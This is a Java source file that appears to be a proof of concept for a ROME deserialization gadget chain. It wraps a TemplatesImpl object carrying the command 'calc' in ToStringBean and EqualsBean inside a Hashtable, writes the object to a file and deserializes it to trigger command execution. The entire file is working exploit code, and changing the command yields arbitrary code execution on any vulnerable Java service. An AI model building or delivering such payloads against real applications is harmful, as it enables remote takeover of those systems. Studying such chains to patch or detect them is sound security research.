package Seri.RomeGadgets;

import Seri.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import Seri.Utils.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Hashtable;

import static Seri.Utils.*;

public class HashMapRome {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Utils.createTemplatesImpl("calc");

        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);



        Hashtable hashtable = new Hashtable<>();
        hashtable.put(equalsBean , "aaa");

        serialize(hashtable ,"bin/RomeHashMap.bin");
        unserialize("bin/RomeHashMap.bin");
    }
}
